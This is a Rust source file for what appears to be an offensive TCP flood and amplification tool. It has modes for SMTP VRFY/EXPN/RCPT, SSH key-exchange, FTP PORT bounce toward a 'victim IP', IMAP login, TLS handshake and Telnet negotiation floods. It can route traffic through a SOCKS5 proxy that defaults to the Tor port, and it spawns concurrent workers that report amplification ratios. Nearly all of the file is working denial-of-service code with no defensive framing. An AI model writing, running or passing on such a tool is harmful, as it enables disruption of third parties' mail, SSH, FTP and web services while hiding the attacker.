use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TcpMode {
    SmtpVrfy,
    SmtpExpn,
    SmtpRcptTo,
    SshAuth,
    FtpBounce,
    FtpList,
    Finger,
    ImapLogin,
    SslReneg,
    TelnetNeg,
    GenericConnect,
}

impl TcpMode {
    pub fn name(&self) -> &'static str {
        match self {
            TcpMode::SmtpVrfy => "SMTP VRFY flood",
            TcpMode::SmtpExpn => "SMTP EXPN flood",
            TcpMode::SmtpRcptTo => "SMTP RCPT TO flood",
            TcpMode::SshAuth => "SSH auth flood",
            TcpMode::FtpBounce => "FTP PORT bounce",
            TcpMode::FtpList => "FTP LIST amplification",
            TcpMode::Finger => "Finger query flood",
            TcpMode::ImapLogin => "IMAP LOGIN flood",
            TcpMode::SslReneg => "SSL renegotiation flood",
            TcpMode::TelnetNeg => "Telnet negotiation flood",
            TcpMode::GenericConnect => "TCP connect flood",
        }
    }

    pub fn default_port(&self) -> u16 {
        match self {
            TcpMode::SmtpVrfy | TcpMode::SmtpExpn | TcpMode::SmtpRcptTo => 25,
            TcpMode::SshAuth => 22,
            TcpMode::FtpBounce | TcpMode::FtpList => 21,
            TcpMode::Finger => 79,
            TcpMode::ImapLogin => 143,
            TcpMode::SslReneg => 443,
            TcpMode::TelnetNeg => 23,
            TcpMode::GenericConnect => 80,
        }
    }

    pub fn from_str(s: &str) -> Option<Self> {
        match s {
            "smtp-vrfy" => Some(TcpMode::SmtpVrfy),
            "smtp-expn" => Some(TcpMode::SmtpExpn),
            "smtp-rcpt" => Some(TcpMode::SmtpRcptTo),
            "ssh-auth" => Some(TcpMode::SshAuth),
            "ftp-bounce" => Some(TcpMode::FtpBounce),
            "ftp-list" => Some(TcpMode::FtpList),
            "finger" => Some(TcpMode::Finger),
            "imap-login" => Some(TcpMode::ImapLogin),
            "ssl-reneg" => Some(TcpMode::SslReneg),
            "telnet" => Some(TcpMode::TelnetNeg),
            "tcp-connect" | "generic" => Some(TcpMode::GenericConnect),
            _ => None,
        }
    }
}

/// SOCKS5 connect through proxy or direct
async fn connect(host: &str, port: u16, proxy: Option<&str>) -> Result<TcpStream, String> {
    tokio::time::timeout(Duration::from_secs(10), async {
        match proxy {
            Some(proxy_url) => {
                let proxy_str = proxy_url
                    .trim_start_matches("socks5h://")
                    .trim_start_matches("socks5://");
                let (proxy_host, proxy_port_str) = proxy_str.split_once(':').unwrap_or((proxy_str, "9050"));
                let proxy_port: u16 = proxy_port_str.parse().unwrap_or(9050);

                let mut stream = TcpStream::connect(format!("{}:{}", proxy_host, proxy_port))
                    .await
                    .map_err(|e| format!("proxy connect: {}", e))?;

                // SOCKS5 handshake
                // 1. greet
                stream.write_all(&[0x05, 0x01, 0x00])
                    .await
                    .map_err(|e| format!("socks5 greet: {}", e))?;
                let mut resp = [0u8; 2];
                stream.read_exact(&mut resp)
                    .await
                    .map_err(|e| format!("socks5 greet resp: {}", e))?;
                if resp[0] != 0x05 || resp[1] != 0x00 {
                    return Err(format!("SOCKS5 auth rejected: {:02x?}", resp));
                }

                // 2. connect request (domain name)
                let host_bytes = host.as_bytes();
                let mut req = Vec::with_capacity(7 + host_bytes.len());
                req.push(0x05);
                req.push(0x01);
                req.push(0x00);
                req.push(0x03);
                req.push(host_bytes.len() as u8);
                req.extend_from_slice(host_bytes);
                req.extend_from_slice(&port.to_be_bytes());

                stream.write_all(&req)
                    .await
                    .map_err(|e| format!("socks5 connect req: {}", e))?;

                let mut resp2 = [0u8; 4];
                stream.read_exact(&mut resp2)
                    .await
                    .map_err(|e| format!("socks5 connect resp: {}", e))?;
                if resp2[1] != 0x00 {
                    return Err(format!("SOCKS5 connect refused: code {}", resp2[1]));
                }

                // Read remaining address
                match resp2[3] {
                    0x01 => {
                        let mut addr = [0u8; 6];
                        stream.read_exact(&mut addr).await.map_err(|e| e.to_string())?;
                    }
                    0x03 => {
                        let mut len = [0u8; 1];
                        stream.read_exact(&mut len).await.map_err(|e| e.to_string())?;
                        let mut addr = vec![0u8; len[0] as usize + 2];
                        stream.read_exact(&mut addr).await.map_err(|e| e.to_string())?;
                    }
                    0x04 => {
                        let mut addr = [0u8; 18];
                        stream.read_exact(&mut addr).await.map_err(|e| e.to_string())?;
                    }
                    _ => {}
                }

                Ok(stream)
            }
            None => {
                TcpStream::connect(format!("{}:{}", host, port))
                    .await
                    .map_err(|e| format!("direct connect: {}", e))
            }
        }
    })
        .await
        .map_err(|_| "connect timeout".to_string())?
}

/// Result of a single protocol exchange: (bytes_sent, bytes_received, duration)
pub struct TcpResult {
    pub sent: usize,
    pub recv: usize,
    pub dur: Duration,
}

/// Run a single TCP amplification exchange. Returns sent/recv bytes.
async fn run_protocol(mode: TcpMode, host: &str, port: u16, proxy: Option<&str>) -> Result<TcpResult, String> {
    let start = Instant::now();
    let mut stream = connect(host, port, proxy).await?;

    // Use tokio::time::timeout for read/write timeouts instead of set_read_timeout
    let mut buf = vec![0u8; 8192];
    let result = tokio::time::timeout(Duration::from_secs(15), async {
        let (sent, recv) = match mode {
            TcpMode::SmtpVrfy => smtp_vrfy(&mut stream, &mut buf).await?,
            TcpMode::SmtpExpn => smtp_expn(&mut stream, &mut buf).await?,
            TcpMode::SmtpRcptTo => smtp_rcpt_to(&mut stream, &mut buf).await?,
            TcpMode::SshAuth => ssh_auth(&mut stream, &mut buf).await?,
            TcpMode::FtpBounce => ftp_bounce(&mut stream, &mut buf).await?,
            TcpMode::FtpList => ftp_list(&mut stream, &mut buf).await?,
            TcpMode::Finger => finger_query(&mut stream, &mut buf).await?,
            TcpMode::ImapLogin => imap_login(&mut stream, &mut buf).await?,
            TcpMode::SslReneg => ssl_reneg(&mut stream, &mut buf).await?,
            TcpMode::TelnetNeg => telnet_neg(&mut stream, &mut buf).await?,
            TcpMode::GenericConnect => generic_connect(&mut stream, &mut buf).await?,
        };
        Ok::<(usize, usize), String>((sent, recv))
    }).await;

    match result {
        Ok(Ok((sent, recv))) => Ok(TcpResult { sent, recv, dur: start.elapsed() }),
        Ok(Err(e)) => Err(e),
        Err(_) => Err("timeout".to_string()),
    }
}

// ================================================================
// SMTP VRFY - sends VRFY command, server looks up address
// Request: ~30B, Response: ~200-500B (user info)
// ================================================================
async fn smtp_vrfy(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read banner
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // EHLO
    stream.write_all(b"EHLO test\r\n").await.map_err(|e| e.to_string())?;
    sent += 12;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // VRFY with random local part
    let user = format!("user{}", rand::random::<u16>());
    let cmd = format!("VRFY {}\r\n", user);
    stream.write_all(cmd.as_bytes()).await.map_err(|e| e.to_string())?;
    sent += cmd.len();
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // QUIT
    stream.write_all(b"QUIT\r\n").await.ok();
    sent += 6;

    Ok((sent, recv))
}

// ================================================================
// SMTP EXPN - expands mailing list, server returns members
// ================================================================
async fn smtp_expn(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"EHLO test\r\n").await.map_err(|e| e.to_string())?;
    sent += 12;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"EXPN postmaster\r\n").await.map_err(|e| e.to_string())?;
    sent += 18;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"QUIT\r\n").await.ok();
    sent += 6;

    Ok((sent, recv))
}

// ================================================================
// SMTP RCPT TO - flood with invalid recipients
// ================================================================
async fn smtp_rcpt_to(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"EHLO test\r\n").await.map_err(|e| e.to_string())?;
    sent += 12;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"MAIL FROM:<>\r\n").await.map_err(|e| e.to_string())?;
    sent += 15;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Send multiple RCPT TOs
    for _ in 0..5 {
        let rcpt = format!("RCPT TO:<user{}@test.com>\r\n", rand::random::<u16>());
        stream.write_all(rcpt.as_bytes()).await.map_err(|e| e.to_string())?;
        sent += rcpt.len();
        let n = stream.read(buf).await.map_err(|e| e.to_string())?;
        recv += n;
    }

    stream.write_all(b"QUIT\r\n").await.ok();
    sent += 6;

    Ok((sent, recv))
}

// ================================================================
// SSH Auth - opens SSH connection, server does crypto work
// ================================================================
async fn ssh_auth(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read SSH banner
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Send our banner
    stream.write_all(b"SSH-2.0-OpenSSH_8.9p1\r\n")
        .await
        .map_err(|e| e.to_string())?;
    sent += 21;

    // Read KEX init
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Send KEX init (minimal)
    let kex_packet = build_ssh_kexinit();
    stream.write_all(&kex_packet).await.map_err(|e| e.to_string())?;
    sent += kex_packet.len();

    // Read response (this triggers DH key exchange - expensive for server)
    // Just read what we can in a short time
    let timeout = tokio::time::sleep(Duration::from_secs(2));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

fn build_ssh_kexinit() -> Vec<u8> {
    // SSH_MSG_KEXINIT packet (RFC 4253)
    let payload: Vec<u8> = vec![
        20, // SSH_MSG_KEXINIT
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, // cookie (16 bytes random)
        // name-list: key exchange algorithms
        0, 0, 0, 38, // length
        b'd', b'i', b'f', b'f', b'i', b'e', b'-', b'h', b'e', b'l', b'l', b'm', b'a', b'n', b'-',
        b'g', b'r', b'o', b'u', b'p', b'-', b'e', b'x', b'c', b'h', b'a', b'n', b'g', b'e', b'-',
        b's', b'h', b'a', b'2', b'5', b'6', b',', b'c', b'u', b'r', b'v', b'e', b'2', b'5', b'5', b'1', b'9', b'-',
        b's', b'h', b'a', b'2', b'5', b'6', b',',
        b'e', b'c', b'd', b'h', b'-', b's', b'h', b'a', b'2', b'-', b'n', b'i', b's', b't', b'p', b'2', b'5', b'6',
        // host key algorithms
        0, 0, 0, 0,
        // encryption algorithms c2s
        0, 0, 0, 27,
        b'a', b'e', b's', b'2', b'5', b'6', b'-', b'c', b't', b'r', b',',
        b'a', b'e', b's', b'1', b'9', b'2', b'-', b'c', b't', b'r', b',',
        b'a', b'e', b's', b'1', b'2', b'8', b'-', b'c', b't', b'r',
        // encryption algorithms s2c
        0, 0, 0, 27,
        b'a', b'e', b's', b'2', b'5', b'6', b'-', b'c', b't', b'r', b',',
        b'a', b'e', b's', b'1', b'9', b'2', b'-', b'c', b't', b'r', b',',
        b'a', b'e', b's', b'1', b'2', b'8', b'-', b'c', b't', b'r',
        // mac algorithms c2s
        0, 0, 0, 22,
        b'h', b'm', b'a', b'c', b'-', b's', b'h', b'a', b'2', b'-', b'2', b'5', b'6', b',',
        b'h', b'm', b'a', b'c', b'-', b's', b'h', b'a', b'1',
        // mac algorithms s2c
        0, 0, 0, 22,
        b'h', b'm', b'a', b'c', b'-', b's', b'h', b'a', b'2', b'-', b'2', b'5', b'6', b',',
        b'h', b'm', b'a', b'c', b'-', b's', b'h', b'a', b'1',
        // compression c2s
        0, 0, 0, 7, b'n', b'o', b'n', b'e', b',',
        // compression s2c
        0, 0, 0, 7, b'n', b'o', b'n', b'e', b',',
        // languages c2s
        0, 0, 0, 0,
        // languages s2c
        0, 0, 0, 0,
        // first_kex_packet_follows
        0,
        // reserved (uint32)
        0, 0, 0, 0,
    ];

    // Packet length (4 bytes) + padding length (1) + payload + padding
    let padding = 8;
    let total_len = 1 + payload.len() + padding;
    let mut packet = Vec::with_capacity(4 + total_len);
    packet.extend_from_slice(&(total_len as u32).to_be_bytes());
    packet.push(padding as u8);
    packet.extend_from_slice(&payload);
    packet.extend(std::iter::repeat(0u8).take(padding));
    packet
}

// ================================================================
// FTP PORT bounce + LIST - sends PORT with victim IP, then LIST
// ================================================================
async fn ftp_bounce(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"USER anonymous\r\n").await.map_err(|e| e.to_string())?;
    sent += 16;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"PASS test@\r\n").await.map_err(|e| e.to_string())?;
    sent += 12;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // PORT with random victim IP (the amplification happens server->victim)
    let a = rand::random::<u8>();
    let b = rand::random::<u8>();
    let c = rand::random::<u8>();
    let d = rand::random::<u8>();
    let p1 = rand::random::<u8>();
    let p2 = rand::random::<u8>();
    let port_cmd = format!("PORT {},{},{},{},{},{}\r\n", a, b, c, d, p1, p2);
    stream.write_all(port_cmd.as_bytes()).await.map_err(|e| e.to_string())?;
    sent += port_cmd.len();
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // LIST
    stream.write_all(b"LIST\r\n").await.map_err(|e| e.to_string())?;
    sent += 6;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"QUIT\r\n").await.ok();
    sent += 6;

    Ok((sent, recv))
}

async fn ftp_list(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"USER anonymous\r\n").await.map_err(|e| e.to_string())?;
    sent += 16;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"PASS test@\r\n").await.map_err(|e| e.to_string())?;
    sent += 12;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // PASV + LIST (standard FTP data channel opening)
    stream.write_all(b"PASV\r\n").await.map_err(|e| e.to_string())?;
    sent += 6;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"LIST\r\n").await.map_err(|e| e.to_string())?;
    sent += 6;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"QUIT\r\n").await.ok();
    sent += 6;

    Ok((sent, recv))
}

// ================================================================
// Finger query /79 — user query, returns full user info
// Request: ~20B, Response: ~500-2000B (gecos, office, phone)
// ================================================================
async fn finger_query(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let query = b"root\r\n";
    stream.write_all(query).await.map_err(|e| e.to_string())?;
    sent += query.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.map_err(|e| e.to_string())?;
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// IMAP LOGIN flood /143 — sends LOGIN, server auths
// ================================================================
async fn imap_login(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"a001 LOGIN testuser testpass\r\n")
        .await
        .map_err(|e| e.to_string())?;
    sent += 29;

    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    Ok((sent, recv))
}

// ================================================================
// SSL/TLS renegotiation /443 — triggers server-side crypto
// Note: This sends a ClientHello, server does asymmetric crypto work
// ================================================================
async fn ssl_reneg(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // TLS 1.2 ClientHello (minimal)
    let client_hello = build_tls_clienthello();
    stream.write_all(&client_hello).await.map_err(|e| e.to_string())?;
    sent += client_hello.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.unwrap_or(0);
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

fn build_tls_clienthello() -> Vec<u8> {
    // TLS record: ClientHello v1.2
    // ContentType: 0x16 (Handshake)
    // Version: 0x0301 (TLS 1.0)
    let mut record = Vec::new();
    record.push(0x16); // Handshake
    record.extend_from_slice(&[0x03, 0x01]); // TLS version
    // Length placeholder - will be filled at the end
    record.extend_from_slice(&[0x00, 0x00]);

    // Handshake: ClientHello
    record.push(0x01); // ClientHello
    // Length placeholder
    record.extend_from_slice(&[0x00, 0x00, 0x00]);

    // Protocol version
    record.extend_from_slice(&[0x03, 0x03]); // TLS 1.2

    // Random (32 bytes)
    for _ in 0..32 {
        record.push(rand::random::<u8>());
    }

    // Session ID (empty)
    record.push(0x00);

    // Cipher suites
    let ciphers: &[u16] = &[
        0xC02B, // TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
        0xC02F, // TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
        0x009C, // TLS_RSA_WITH_AES_128_GCM_SHA256
        0x003C, // TLS_RSA_WITH_AES_128_CBC_SHA
    ];
    record.push(((ciphers.len() * 2) >> 8) as u8);
    record.push(((ciphers.len() * 2) & 0xFF) as u8);
    for c in ciphers {
        record.extend_from_slice(&c.to_be_bytes());
    }

    // Compression methods (1 null)
    record.push(0x01);
    record.push(0x00);

    // Extensions length
    record.extend_from_slice(&[0x00, 0x00]);

    // Fill in lengths
    let handshake_len = record.len() - 5; // from record type to end
    let record_len = record.len() - 5; // from version to end

    record[3] = (record_len >> 8) as u8;
    record[4] = (record_len & 0xFF) as u8;
    record[6] = ((handshake_len - 4) >> 16) as u8;
    record[7] = ((handshake_len - 4) >> 8) as u8;
    record[8] = ((handshake_len - 4) & 0xFF) as u8;

    record
}

// ================================================================
// Telnet negotiation — sends WILL/WONT/DONT/DO to trigger negotiation
// ================================================================
async fn telnet_neg(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // IAC DO TIMING-MARK (triggers response)
    // IAC WILL SUPPRESS-GO-AHEAD
    // IAC DO TERMINAL-TYPE
    let neg = &[
        0xFF, 0xFD, 0x06, // IAC DO TIMING-MARK
        0xFF, 0xFB, 0x03, // IAC WILL SUPPRESS-GO-AHEAD
        0xFF, 0xFD, 0x18, // IAC DO TERMINAL-TYPE
        0xFF, 0xFB, 0x1F, // IAC WILL NAWS
        0xFF, 0xFD, 0x20, // IAC DO TERMINAL-SPEED
    ];

    stream.write_all(neg).await.map_err(|e| e.to_string())?;
    sent += neg.len();

    let timeout = tokio::time::sleep(Duration::from_secs(2));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.unwrap_or(0);
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// Generic TCP connect — just opens and closes
// ================================================================
async fn generic_connect(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut recv = 0;

    // Just read whatever the server sends (banner, etc.)
    let timeout = tokio::time::sleep(Duration::from_secs(1));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.unwrap_or(0);
        }
        _ = timeout => {}
    }

    Ok((0, recv))
}

/// Run TCP load: spawns workers that repeatedly connect and send protocol data
pub async fn run_tcp_load(
    mode: TcpMode,
    target: &str,
    proxy: Option<String>,
    concurrency: usize,
    duration_secs: u64,
) {
    let start = Instant::now();
    let dur = Duration::from_secs(duration_secs);
    let port = mode.default_port();
    let host = target.split(':').next().unwrap_or(target);
    let custom_port = target.split(':').nth(1).and_then(|p| p.parse::<u16>().ok());

    let port = custom_port.unwrap_or(port);

    println!("=== TCP Amplification: {} ===", mode.name());
    println!("Target: {}:{} | Concurrency: {} | Duration: {}s", host, port, concurrency, duration_secs);
    if proxy.is_some() {
        println!("Proxy: {}", proxy.as_ref().unwrap());
    }
    println!();

    let mut total_sent: u64 = 0;
    let mut total_recv: u64 = 0;
    let mut total_requests: u64 = 0;
    let mut total_errors: u64 = 0;

    while start.elapsed() < dur {
        let mut handles = Vec::new();
        let batch_start = Instant::now();

        for _ in 0..concurrency {
            let host = host.to_string();
            let proxy = proxy.clone();
            let mode = mode;

            handles.push(tokio::spawn(async move {
                match run_protocol(mode, &host, port, proxy.as_deref()).await {
                    Ok(result) => {
                        (result.sent as u64, result.recv as u64, result.dur, false)
                    }
                    Err(e) => {
                        (0u64, 0u64, Duration::ZERO, true)
                    }
                }
            }));
        }

        for h in handles {
            match h.await {
                Ok((sent, recv, _dur, is_err)) => {
                    total_sent += sent;
                    total_recv += recv;
                    total_requests += 1;
                    if is_err { total_errors += 1; }
                }
                Err(_) => {
                    total_errors += 1;
                    total_requests += 1;
                }
            }
        }

        let elapsed = start.elapsed().as_secs();
        let _batch_elapsed = batch_start.elapsed().as_secs_f64();

        // Status update
        if elapsed % 5 == 0 || total_requests < 10 {
            let amp_ratio = if total_sent > 0 {
                total_recv as f64 / total_sent as f64
            } else {
                0.0
            };
            println!(
                "[{:3}s] Req: {:5} | Err: {:3} | Sent: {}KB | Recv: {}KB | Ratio: {:.1}x | Rate: {:.0} req/s",
                elapsed,
                total_requests,
                total_errors,
                total_sent / 1024,
                total_recv / 1024,
                amp_ratio,
                total_requests as f64 / elapsed.max(1) as f64,
            );
        }
    }

    let elapsed = start.elapsed().as_secs().max(1);
    let amp_ratio = if total_sent > 0 {
        total_recv as f64 / total_sent as f64
    } else {
        0.0
    };
    println!();
    println!("=== Results ===");
    println!("Total requests: {}", total_requests);
    println!("Total errors:   {}", total_errors);
    println!("Sent:           {} bytes ({} KB)", total_sent, total_sent / 1024);
    println!("Received:       {} bytes ({} KB)", total_recv, total_recv / 1024);
    println!("Amplification:  {:.1}x", amp_ratio);
    println!("Rate:           {:.0} req/s", total_requests as f64 / elapsed as f64);
}
